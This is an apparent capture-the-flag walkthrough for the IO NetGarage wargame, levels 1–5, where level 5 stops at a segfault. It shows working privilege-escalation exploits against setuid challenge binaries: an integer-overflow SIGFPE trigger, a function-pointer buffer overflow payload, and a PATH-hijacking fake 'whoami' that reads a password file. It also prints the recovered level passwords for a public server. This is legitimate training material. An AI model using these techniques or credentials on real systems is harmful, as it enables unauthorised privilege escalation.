# IO NetGarage 2

SSH Access:

ssh -p 2224  level1@io.netgarage.org

## level 1

`❮ ssh -p 2224  level1@io.netgarage.org`

Just read the ~/README, challenges are in `/levels`

```
level1@io:/levels$ ls -ltra level01
-r-sr-x--- 1 level2 level1 1184 Jan 13  2014 level01
level1@io:/levels$ ./level01
Enter the 3 digit passcode to enter: 123
```

Checking the asm code:

```
level1@io:/levels$ objdump -d level01
level01:     file format elf32-i386
Disassembly of section .text:
08048080 <_start>:
 8048080:       68 28 91 04 08          push   $0x8049128
 8048085:       e8 85 00 00 00          call   804810f <puts>
 804808a:       e8 10 00 00 00          call   804809f <fscanf>
 804808f:       3d 0f 01 00 00          cmp    $0x10f,%eax
 8048094:       0f 84 42 00 00 00       je     80480dc <YouWin>
 804809a:       e8 64 00 00 00          call   8048103 <exit>
```

Notice the `cmp $0x10f,%eax`, a comparision is being made there. `0x10f` is the response.

```python
>>> int("0x10f", 16)
271
```

Finding the flag:

```
level1@io:/levels$ ./level01
Enter the 3 digit passcode to enter: 271
Congrats you found it, now read the password for level2 from /home/level2/.pass
sh-4.3$ cat .pass
sh-4.3$ whoami
level2
sh-4.3$ cat /home/level2/.pass
XNWFtWKWHhaaXoKI
```

## level 2

`ssh -p 2224  level2@io.netgarage.org`

Checking files

```
level2@io:/levels$ find /levels -group level2
/levels/level02_alt.c
/levels/level02.c
find: ‘/levels/beta’: Permission denied
/levels/level02
/levels/level02_alt
```

```bash
level2@io:/levels$ /levels/level02
source code is available in level02.c

level2@io:/levels$ cat level02.c
//a little fun brought to you by bla

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
        printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}

int main(int argc, char **argv)
{
        puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

As the file `level02` also belgons the user `level03` it means if we can pop `/bin/sh` then we will become `level03` user.

```bash
level2@io:/levels$ ls -ltra level02
-r-sr-x--- 1 level3 level2 5329 Oct  4  2011 level02
```

From the C code we need to trigger a SIGFPE exception so it will call the `catcher()` function.

From wikipedia:
> SIGFPE. The SIGFPE signal is sent to a process when it executes an erroneous arithmetic operation, such as division by zero.

The `abs()` function works only with intenger numbers, which means if we manage to make abs() fail overflowing its value the we will be executing the `catcher()` function.

Lowest intenger value:

```
❯ echo "-2^31" | bc
-2147483648
```

```bash
level2@io:/levels$ ./level02 "-2147483648" "-1"
source code is available in level02.c

WIN!
sh-4.3$
sh-4.3$ whoami
level3
sh-4.3$ cat /home/level3/.pass
OlhCmdZKbuzqngfz
```

## level 3

```bash
level3@io:~$ /levels/level03
level3@io:~$ cat /levels/level03.c
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```

Similar situation than previous one but different C challenge.

So we already know that we want to execute the `good()` function which is going to give us a `/bin/sh`.

```bash
level3@io:~$ /levels/level03 1234
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
```

Ok, we have to buffer overflow this.

```bash
❯ ./pattern_create.rb -l 80
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
```

From GDB:

```bash
gdb$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
Starting program: /levels/level03 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
...
Breakpoint 1, 0x080484c8 in main ()
gdb$ c
Continuing.
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
...
Breakpoint 1, 0x080484c8 in main ()
gdb$ c
Continuing.
This is exciting we're going to 0x63413563

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x63413563  EBX: 0x00000000  ECX: 0x7FFFFFD5  EDX: 0xB7FC3870  o d I t S z a P c
  ESI: 0x00000002  EDI: 0xB7FC2000  EBP: 0xBFFFFC28  ESP: 0xBFFFFBAC  EIP: 0x63413563
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
Cannot access memory at address 0x63413563
0x63413563 in ?? ()
```

Calculating the exact offset:

```bash
❯ ./pattern_offset.rb -l 80 -q 0x63413563
[*] Exact match at offset 76
```

And finally...

```bash
level3@io:~$ /levels/level03 $(python -c 'print "A"*76 + "\x74\x84\x04\x08"')
This is exciting we're going to 0x8048474
Win.
sh-4.3$ whoami
level4
sh-4.3$ cat /home/level4/.pass
7WhHa5HWMNRAYl9T
```

## level 4

```
level4@io:~$ /levels/level04
Welcome level5
level4@io:~$ cat /levels/level04.c
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```

At the begining I tought I could overflow `username` on the `fgets()` function, but later I have realized that the `popen` is a Linux syscall which pipes a command line execution and by passing the argument `r` it is reading from the child process. Arg `w` does the opposite. All I have to do is to fake the `whoami` bin.

```bash
level4@io:~$ mkdir /tmp/nohere && cd /tmp/nohere
level4@io:/tmp/nohere$ vim whoami
level4@io:/tmp/nohere$ chmod +x whoami
level4@io:/tmp/nohere$ cat whoami
#!/bin/sh
cat /home/level5/.pass
level4@io:/tmp/nohere$ whoami
level4
level4@io:/tmp/nohere$ echo $PATH
/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
level4@io:/tmp/nohere$ export PATH=/tmp/nohere:$PATH
level4@io:/tmp/nohere$ whoami
cat: /home/level5/.pass: Permission denied
level4@io:/tmp/nohere$ /levels/level04
Welcome DNLM3Vu0mZfX0pDd
```
## level 5

```
level5@io:~$ cat /levels/level05.c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
        char buf[128];
        if(argc < 2) return 1;
        strcpy(buf, argv[1]);
        printf("%s\n", buf);
        return 0;
}

level5@io:~$ ls -ltra /levels/level05
-r-sr-x--- 1 level6 level5 7140 Nov 16  2007 /levels/level05
```

This one has to be overflowed and it seems that we will need a pop a shell which will belong to `level6` user.

Segmentation fault found:
```
level5@io:~$ /levels/level05 $(python -c 'print "A"*141')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

## level 6
## level 7
## level 8
